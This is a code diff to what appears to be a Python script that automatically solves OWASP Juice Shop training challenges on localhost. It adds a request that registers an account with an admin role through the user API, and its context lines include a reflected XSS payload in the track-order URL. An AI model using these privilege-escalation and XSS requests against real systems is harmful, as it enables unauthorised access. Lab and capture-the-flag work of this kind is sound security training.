@@ -3,6 +3,8 @@ url='http://localhost:3000' # Indicate the URL without '/' at the end
 import requests
 
 # ==== No required action ====
+# ---- Admin Registration (Register as a user with administrator privileges.)
+requests.post(url+'/api/Users',data={'email':'admin','password':'admin','role':'admin'})
 # ---- Admin Section (Access the administration section of the store.)
 requests.get(url+'/assets/public/images/padding/19px.png')
 # ---- Confidential Document (Access a confidential document.)
@@ -20,7 +22,7 @@ requests.get(url+'/assets/public/images/padding/81px.png')
 # ---- Reflected XSS (Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">.)
 requests.get(url+'/rest/track-order/<iframe src="javascript:alert(`xss`)">')
 # ---- Repetitive Registration (Follow the DRY principle while registering a user.)
-requests.post(url+'/api/Users/',data={'email':"aaaaaaa@juice-sh.op","password":"aaaaaaa","passwordRepeat":"aaaaaa","securityQuestion":{"id":6,"question":"Paternal grandmother's first name?","createdAt":"2020-01-16T14:58:58.420Z","updatedAt":"2020-01-16T14:58:58.420Z"},"securityAnswer":"aaaaaaa"})
+requests.post(url+'/api/Users',data={'email':"aaaaaaa@juice-sh.op","password":"aaaaaaa","passwordRepeat":"aaaaaa","securityQuestion":{"id":6,"question":"Paternal grandmother's first name?","createdAt":"2020-01-16T14:58:58.420Z","updatedAt":"2020-01-16T14:58:58.420Z"},"securityAnswer":"aaaaaaa"})
 # ---- Score Board (Find the carefully hidden 'Score Board' page.)
 requests.get(url+'/assets/public/images/padding/1px.png')
 # ---- Security Policy (Behave like any "white-hat" should before getting into the action.)
